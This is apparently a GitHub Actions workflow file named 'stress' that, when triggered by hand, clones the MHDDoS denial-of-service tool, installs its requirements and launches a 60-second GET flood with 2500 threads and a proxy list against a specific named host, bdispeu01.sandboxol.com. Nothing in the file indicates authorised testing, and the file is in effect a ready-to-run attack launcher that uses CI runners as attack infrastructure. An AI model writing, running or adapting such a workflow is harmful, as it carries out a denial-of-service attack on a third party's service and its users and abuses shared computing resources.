name: stress
on: workflow_dispatch
jobs:
  stress:
    runs-on: ubuntu-24.04-arm
    steps:
      - run: |
          git clone https://github.com/MatrixTM/MHDDoS.git
          cd MHDDoS
          pip install -r requirements.txt
          python start.py GET http://bdispeu01.sandboxol.com/v1/dispatch 0 2500 all.txt 2500 60 true
